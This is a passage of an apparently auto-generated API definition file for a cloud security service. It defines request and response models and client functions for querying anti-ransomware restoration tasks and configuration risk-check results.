*   **CLIENT_DELETED**: The task fails because the anti-ransomware agent is uninstalled.', example='COMPLETE'),
      target?: string(name='Target', description='The folder to which the backup data is restored. After you create the restoration task, the backup data is restored to the specified folder.', example='/home'),
      updatedTime?: long(name='UpdatedTime', description='The timestamp when the restoration task was last updated. Unit: milliseconds.', example='1583289054000'),
      uuid?: string(name='Uuid', description='The UUID of the server whose data you want to restore.', example='6E3DABB6-3F6A-40DB-9492-2C8B59C****'),
      vaultId?: string(name='VaultId', description='The ID of the backup vault in which the backup data is stored.', example='v-000b0v0jqzmse2yz06zw'),
      vaultRegionId?: string(name='VaultRegionId', description='The ID of the region where the backup vault resides.', example='cn-hangzhou'),
    }
  ](name='RestoreJobs', description='The details about the restoration tasks.'),
}

model DescribeRestoreJobsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeRestoreJobsResponseBody(name='body'),
}

/**
 * @summary Queries the details about restoration tasks.
 *
 * @description If the data on your servers is encrypted by ransomware, you can create a restoration task to restore the data on your servers by using backup data in Security Center.
 * >  After you enable an anti-ransomware policy, the data on your servers is backed up based on the policy. For more information about anti-ransomware policies, see [Manage protection policies](https://help.aliyun.com/document_detail/164781.html).
 *
 * @param request DescribeRestoreJobsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeRestoreJobsResponse
 */
async function describeRestoreJobsWithOptions(request: DescribeRestoreJobsRequest, runtime: Util.RuntimeOptions): DescribeRestoreJobsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.machineRemark)) {
    query['MachineRemark'] = request.machineRemark;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRestoreJobs',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details about restoration tasks.
 *
 * @description If the data on your servers is encrypted by ransomware, you can create a restoration task to restore the data on your servers by using backup data in Security Center.
 * >  After you enable an anti-ransomware policy, the data on your servers is backed up based on the policy. For more information about anti-ransomware policies, see [Manage protection policies](https://help.aliyun.com/document_detail/164781.html).
 *
 * @param request DescribeRestoreJobsRequest
 * @return DescribeRestoreJobsResponse
 */
async function describeRestoreJobs(request: DescribeRestoreJobsRequest): DescribeRestoreJobsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRestoreJobsWithOptions(request, runtime);
}

model DescribeRestorePlansRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  instanceName?: string(name='InstanceName', description='The name of the server.', example='sql-test-001'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  status?: string(name='Status', description='The status of the restoration task. Valid values:

*   **init**: initializing
*   **created**: creating
*   **running**: running
*   **completed**: complete
*   **error**: failed
*   **restoring**: restoring', example='running'),
}

model DescribeRestorePlansResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='33'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578AB****'),
  restorePlans?: [ 
    {
      createdTime?: long(name='CreatedTime', description='The timestamp when the restoration task was created. Unit: milliseconds.', example='1655174753****'),
      databaseName?: string(name='DatabaseName', description='The name of the database.', example='Bankup****'),
      instanceName?: string(name='InstanceName', description='The name of the server on which the database resides.', example='sql-test-001'),
      policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.', example='123'),
      policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy.', example='KtDataBase'),
      restorePoint?: long(name='RestorePoint', description='The point in time to which data is restored.', example='165875100****'),
      status?: string(name='Status', description='The status of the restoration task. Valid values:

*   **init**: initializing
*   **created**: creating
*   **running**: running
*   **completed**: complete
*   **error**: failed
*   **restoring**: restoring', example='running'),
      targetDatabaseName?: string(name='TargetDatabaseName', description='The name of the destination database.', example='OABak'),
      targetInstanceId?: string(name='TargetInstanceId', description='The ID of the destination server.', example='i-2zehqflgbl9ep2he****'),
      targetInstanceName?: string(name='TargetInstanceName', description='The name of the destination server.', example='hbr-detection-hh'),
      updatedTime?: long(name='UpdatedTime', description='The timestamp when the restoration task was last updated. Unit: milliseconds.', example='166849080****'),
    }
  ](name='RestorePlans', description='An array that consists of the restoration tasks.'),
}

model DescribeRestorePlansResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeRestorePlansResponseBody(name='body'),
}

/**
 * @summary Queries restoration tasks.
 *
 * @param request DescribeRestorePlansRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeRestorePlansResponse
 */
async function describeRestorePlansWithOptions(request: DescribeRestorePlansRequest, runtime: Util.RuntimeOptions): DescribeRestorePlansResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.instanceName)) {
    query['InstanceName'] = request.instanceName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRestorePlans',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries restoration tasks.
 *
 * @param request DescribeRestorePlansRequest
 * @return DescribeRestorePlansResponse
 */
async function describeRestorePlans(request: DescribeRestorePlansRequest): DescribeRestorePlansResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRestorePlansWithOptions(request, runtime);
}

model DescribeRiskCheckItemResultRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  itemId?: long(name='ItemId', description='The ID of the check item.

> For more information about the IDs and details of the check items that can be used in configuration assessment, see [DescribeRiskCheckResult](~~DescribeRiskCheckResult~~).

This parameter is required.', example='2'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='173.128.XX.XX'),
}

model DescribeRiskCheckItemResultResponseBody = {
  pageContentResource?: {
    contentResource?: map[string]any(name='ContentResource', description='The data of the affected assets on each page in a dynamic table.'),
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageCount?: int32(name='PageCount', description='The total number of pages returned.', example='3'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  }(name='PageContentResource', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='3BFB4989-A108-46A4-954E-FF7EF02D1078'),
}

model DescribeRiskCheckItemResultResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeRiskCheckItemResultResponseBody(name='body'),
}

/**
 * @deprecated OpenAPI DescribeRiskCheckItemResult is deprecated
 *
 * @summary Queries the assets that are affected by the risk item detected in configuration assessment based on a specified check item.
 *
 * @description This operation is phased out. You can use the ListCheckInstanceResult operation.
 *
 * @param request DescribeRiskCheckItemResultRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeRiskCheckItemResultResponse
 */
// Deprecated
async function describeRiskCheckItemResultWithOptions(request: DescribeRiskCheckItemResultRequest, runtime: Util.RuntimeOptions): DescribeRiskCheckItemResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.itemId)) {
    query['ItemId'] = request.itemId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskCheckItemResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @deprecated OpenAPI DescribeRiskCheckItemResult is deprecated
 *
 * @summary Queries the assets that are affected by the risk item detected in configuration assessment based on a specified check item.
 *
 * @description This operation is phased out. You can use the ListCheckInstanceResult operation.
 *
 * @param request DescribeRiskCheckItemResultRequest
 * @return DescribeRiskCheckItemResultResponse
 */
// Deprecated
async function describeRiskCheckItemResult(request: DescribeRiskCheckItemResultRequest): DescribeRiskCheckItemResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskCheckItemResultWithOptions(request, runtime);
}

model DescribeRiskCheckResultRequest {
  assetType?: string(name='AssetType', description='The cloud service whose configuration check results you want to query. For more information about the check items for the cloud service, see the check item table in the "Response parameters" section of this topic.', example='RDS'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  groupId?: long(name='GroupId', description='The type of the check item that you want to query. Valid values:

*   **1**: identity authentication and permissions
*   **2**: network access control
*   **3**: log audit
*   **4**: data security
*   **5**: monitoring and alerting
*   **6**: basic security protection

> If you do not specify this parameter, all types of check items are queried.', example='1'),
  itemIds?: [ string ](name='ItemIds', description='An array that consists of the IDs of check items. For more information about the check item, see the check item table in the "Response parameters" section of this topic.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: string(name='Name', description='The name of the check item. For more information about the check item, see the check item table in the "Response parameters" section of this topic.', example='ALB_NetWorkAccessControl'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  queryFlag?: string(name='QueryFlag', description='Specifies whether the check item is supported by the edition of Security Center that you purchase. Valid values:

*   **enabled**: yes
*   **disabled**: no', example='enabled'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  riskLevel?: string(name='RiskLevel', description='The risk level of the check item that you want to query. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  status?: string(name='Status', description='The status of the check results. Valid values:

*   **pass**
*   **failed**
*   **running**
*   **waiting**
*   **ignored**
*   **falsePositive**', example='pass'),
}

model DescribeRiskCheckResultResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  list?: [ 
    {
      affectedCount?: int32(name='AffectedCount', description='The number of affected assets.', example='0'),
      checkTime?: long(name='CheckTime', description='The timestamp when the last check was performed. Unit: milliseconds.', example='1639429164000'),
      itemId?: long(name='ItemId', description='The ID of the check item. For more information about the check item, see the check item table in the "Response parameters" section of this topic.', example='1'),
      remainingTime?: int32(name='RemainingTime', description='The time when the next check will be performed.', example='0'),
      repairStatus?: string(name='RepairStatus', description='Indicates whether the risks that are detected based on the check item can be fixed. Valid values:

*   **enabled**: yes
*   **disabled**: no', example='disabled'),
      riskAssertType?: string(name='RiskAssertType', description='The type of the affected assets.', example='ECS'),
      riskItemResources?: [ 
        {
          contentResource?: map[string]any(name='ContentResource', description='The details about the check results.'),
          resourceName?: string(name='ResourceName', description='The title in the details. Valid values:

*   **bestPractice**: description
*   **influence**: risk
*   **suggestion**: solution
*   **helpResource**: reference', example='bestPractice'),
        }
      ](name='RiskItemResources', description='An array that consists of the details about the check item.'),
      riskLevel?: string(name='RiskLevel', description='The risk level of the check item. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      sort?: int32(name='Sort', description='The sequence number in the check results. The check items are sorted based on the sequence number.', example='1'),
      startStatus?: string(name='StartStatus', description='Indicates whether the check item is supported by the edition of Security Center that you purchase. Valid values:

*   **enabled**: yes
*   **disable**: no', example='enabled'),
      status?: string(name='Status', description='The status of the check results. Valid values:

*   **pass**
*   **failed**
*   **running**
*   **waiting**
*   **ignored**
*   **falsePositive**', example='pass'),
      taskId?: long(name='TaskId', description='The ID of the check task.', example='15384933'),
      title?: string(name='Title', description='The name of the check item.', example='RDS - Whitelist Configuration'),
      type?: string(name='Type', description='The type of the check item. Valid values:

*   Identity authentication and permissions
*   Network access control
*   Log audit
*   Data security
*   Monitoring and alerting
*   Basic security protection', example='Log audit'),
    }
  ](name='List', description='The check items.'),
  pageCount?: int32(name='PageCount', description='The total number of pages returned.', example='20'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AD271C07-4ACE-413D-AA9B-F14FD3B7717F'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='12'),
}

model DescribeRiskCheckResultResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeRiskCheckResultResponseBody(name='body'),
}

/**
 * @deprecated OpenAPI DescribeRiskCheckResult is deprecated
 *
 * @summary Queries the check results of cloud service configurations by check item type or name.
 *
 * @description This operation is phased out. You can use the [ListCheckResult](~~ListCheckResult~~) operation.
 *
 * @param request DescribeRiskCheckResultRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeRiskCheckResultResponse
 */
// Deprecated
async function describeRiskCheckResultWithOptions(request: DescribeRiskCheckResultRequest, runtime: Util.RuntimeOptions): DescribeRiskCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.itemIds)) {
    query['ItemIds'] = request.itemIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.queryFlag)) {
    query['QueryFlag'] = request.queryFlag;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @deprecated OpenAPI DescribeRiskCheckResult is deprecated
 *
 * @summary Queries the check results of cloud service configurations by check item type or name.
 *
 * @description This operation is phased out. You can use the [ListCheckResult](~~ListCheckResult~~) operation.
 *
 * @param request DescribeRiskCheckResultRequest
 * @return DescribeRiskCheckResultResponse
 */
// Deprecated
async function describeRiskCheckResult(request: DescribeRiskCheckResultRequest): DescribeRiskCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskCheckResultWithOptions(request, runtime);
}

model DescribeRiskCheckSummaryRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId', description='The ID of the Alibaba Cloud account that is added as a member by using the multi-account control feature.', example='1232428423234****'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
}

model DescribeRiskCheckSummaryResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='291B49F9-1685-4005-9D34-606B6F78740F'),
  riskCheckSummary?: {
    affectedAssetCount?: int32(name='AffectedAssetCount', description='The number of affected assets.', example='0'),
    disabledRiskCount?: int32(name='DisabledRiskCount', description='The number of the check items that failed the check.', example='0'),
    enabledRiskCount?: int32(name='EnabledRiskCount', description='The number of the check items that passed the check.', example='3'),
    groups?: [ 
      {
        countByStatus?: [ 
          {
            count?: int32(name='Count', description='The number of detected risk items.', example='2'),
            status?: string(name='Status', description='The status of the check item after the check is finished. Valid values:

*   **pass**: The check item passed the check, which indicates that the check item is normal.
*   **failed**: The check item failed the check, which indicates that risks are detected based on the check item.', example='pass'),
          }
        ](name='CountByStatus', description='An array that consists of the statistics about check results.'),
        id?: long(name='Id', description='The ID of the check item type.', example='1'),
        remainingTime?: int32(name='RemainingTime', description='The remaining time before the check is complete.', example='0'),
        sort?: int32(name='Sort', description='The sequence number of the check item type in the **All Types** drop-down list in the Security Center console.', example='1'),
        status?: string(name='Status', description='The status of the check. Valid values:

*   **finish**: The check is finished.
*   **running**: The check is in progress.
*   **waiting**: The check is pending.
*   **notStart**: The check is not started.', example='finish'),
        title?: string(name='Title', description='The name of the check item type.', example='Identity authentication and permissions'),
      }
    ](name='Groups', description='An array that consists of the statistics for each type of check item.'),
    itemCount?: int32(name='ItemCount', description='The number of check items.', example='4'),
    previousCount?: int32(name='PreviousCount', description='The number of risk items detected in the last check.', example='0'),
    previousTime?: long(name='PreviousTime', description='The timestamp of the last check. Unit: milliseconds.', example='1545012926000'),
    riskCount?: int32(name='RiskCount', description='The number of detected risk items.', example='1'),
    riskLevelCount?: [ 
      {
        count?: int32(name='Count', description='The number of check items at the specified risk level.', example='1'),
        key?: string(name='Key', description='The risk level of the check items. Valid values:

*   **high**
*   **medium**
*   **low**', example='medium'),
      }
    ](name='RiskLevelCount', description='An array that consists of the number of check items at each risk level.'),
    riskRate?: float(name='RiskRate', description='The proportion of risk items to all check items.', example='0.25'),
  }(name='RiskCheckSummary', description='The summary information about the check results of cloud service configurations.'),
}

model DescribeRiskCheckSummaryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeRiskCheckSummaryResponseBody(name='body'),
}

/**
 * @deprecated OpenAPI DescribeRiskCheckSummary is deprecated
 *
 * @summary Queries the summary information about the check results of cloud service configurations. The information includes the number of risk items, the risk rate, the number of affected assets, the check time, and the statistics for each type of check item.
 *
 * @description This operation is phased out. You can use the GetCheckSummary operation.
 *
 * @param request DescribeRiskCheckSummaryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeRiskCheckSummaryResponse
 */
// Deprecated
async function describeRiskCheckSummaryWithOptions(request: DescribeRiskCheckSummaryRequest, runtime: Util.RuntimeOptions): DescribeRiskCheckSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskCheckSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @deprecated OpenAPI DescribeRiskCheckSummary is deprecated
 *
 * @summary Queries the summary information about the check results of cloud service configurations. The information includes the number of risk items, the risk rate, the number of affected assets, the check time, and the statistics for each type of check item.
 *
 * @description This operation is phased out. You can use the GetCheckSummary operation.
 *
 * @param request DescribeRiskCheckSummaryRequest
 * @return DescribeRiskCheckSummaryResponse
 */
// Deprecated
async function describeRiskCheckSummary(request: DescribeRiskCheckSummaryRequest): DescribeRiskCheckSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskCheckSummaryWithOptions(request, runtime);
}

model DescribeRiskItemTypeRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='183.237.XX.XX'),
}

model DescribeRiskItemTypeResponseBody = {
  list?: [ 
    {
      id?: long(name='Id', description='The ID of the check item.', example='37625'),
      title?: string(name='Title', description='The name of the check type.', example='Identity authentication and permissions'),
    }
  ](name='List', description='An array that consists of information about the type of the check item.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3B3F3A90-46A5-4023-A2D8-D68B14262F96'),
}

model DescribeRiskItemTypeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeRiskItemTypeResponseBody(name='body'),
}

/**
 * @deprecated OpenAPI DescribeRiskItemType is deprecated
 *
 * @summary Queries the types of check items in configuration assessment.
 *
 * @description This operation is phased out. You can use the ListCheckStandard operation instead.
 *
 * @param request DescribeRiskItemTypeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeRiskItemTypeResponse
 */
// Deprecated
async function describeRiskItemTypeWithOptions(request: DescribeRiskItemTypeRequest, runtime: Util.RuntimeOptions): DescribeRiskItemTypeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskItemType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @deprecated OpenAPI DescribeRiskItemType is deprecated
 *
 * @summary Queries the types of check items in configuration assessment.
 *
 * @description This operation is phased out. You can use the ListCheckStandard operation instead.
 *
 * @param request DescribeRiskItemTypeRequest
 * @return DescribeRiskItemTypeResponse
 */
// Deprecated
async function describeRiskItemType(request: DescribeRiskItemTypeRequest): DescribeRiskItemTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskItemTypeWithOptions(request, runtime);
}

model DescribeRiskListCheckResultRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page 1. Default value: 1.', example='1'),
  instanceIds?: [ string ](name='InstanceIds', description='The instance IDs of the cloud services that you want to query. Separate multiple IDs with commas (,).

> If you do not specify this parameter, an empty list is returned.'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='59.57.XX.XX'),
}

model DescribeRiskListCheckResultResponseBody = {
  list?: [ 
    {
      instanceId?: string(name='InstanceId', description='The instance ID of the cloud service.', example='rm-bp1e8t4q15sr3****'),
      riskCount?: long(name='riskCount', description='The total number of risk items detected in the current cloud service.', example='3'),
    }
  ](name='List', description='The number of risk items for each cloud service.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3BFB4989-A108-46A4-954E-FF7EF02D1078'),
}

model DescribeRiskListCheckResultResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeRiskListCheckResultResponseBody(name='body'),
}

/**
 * @deprecated OpenAPI DescribeRiskListCheckResult is deprecated
 *
 * @summary Queries the number of risk items detected in the configuration assessment of one or more cloud services by using the instance IDs of the cloud services.
 *
 * @description This operation is phased out. You can use the ListCheckResult operation. When you call the ListCheckResult operation, set the Statuses parameter to NOT_PASS.
 *
 * @param request DescribeRiskListCheckResultRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeRiskListCheckResultResponse
 */
// Deprecated
async function describeRiskListCheckResultWithOptions(request: DescribeRiskListCheckResultRequest, runtime: Util.RuntimeOptions): DescribeRiskListCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskListCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @deprecated OpenAPI DescribeRiskListCheckResult is deprecated
 *
 * @summary Queries the number of risk items detected in the configuration assessment of one or more cloud services by using the instance IDs of the cloud services.
 *
 * @description This operation is phased out. You can use the ListCheckResult operation. When you call the ListCheckResult operation, set the Statuses parameter to NOT_PASS.
 *
 * @param request DescribeRiskListCheckResultRequest
 * @return DescribeRiskListCheckResultResponse
 */
// Deprecated
async function describeRiskListCheckResult(request: DescribeRiskListCheckResultRequest): DescribeRiskListCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskListCheckResultWithOptions(request, runtime);
}

model DescribeRiskTypeRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  source?: string(name='Source', description='The data source. Valid values:

*   **default**: host baseline
*   **agentless**: agentless baseline', example='agentless'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.X.X'),
}

model DescribeRiskTypeResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F22037B5-FCE4-5178-A9E7-71798E1F9270'),
  riskTypes?: [ 
    {
      alias?: string(name='Alias', description='The alias of the baseline type.', example='Redis unauthorized access high exploit vulnerability risk'),
      authFlag?: boolean(name='AuthFlag', description='The baseline type flag of the current user version. Valid values:

- **true**: Have access
- **false**: No permissions', example='true'),
      subTypes?: [ 
        {
          alias?: string(name='Alias', description='The alias of the baseline subtype.', example='Redis unauthorized access high exploit vulnerability risk'),
          authFlag?: boolean(name='AuthFlag', description='The baseline subtype permission flag of the current user version. Valid values:

- **true**: Have access
- **false**: No permissions', example='true'),
          checkDetails?: [ 
            {
